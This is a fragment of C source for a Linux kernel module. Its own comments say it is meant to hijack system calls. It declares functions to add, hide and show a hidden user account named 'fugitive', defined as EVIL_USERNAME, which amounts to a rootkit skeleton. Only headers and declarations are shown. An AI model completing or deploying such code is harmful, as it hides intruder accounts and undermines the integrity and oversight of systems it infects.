#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/errno.h>
// needed for file io
#include <linux/fs.h>
#include <linux/slab.h>
// needed for syscall hijack
#include <linux/kallsyms.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");

#define EVIL_USERNAME "fugitive"

// account management functions
int import_fugitive(void);
// int deport_fugitive(void);
int hide_fugitive(void);
int show_fugitive(void);

int __init temp_init(void);
void __exit temp_exit(void);

module_init(temp_init);
module_exit(temp_exit);
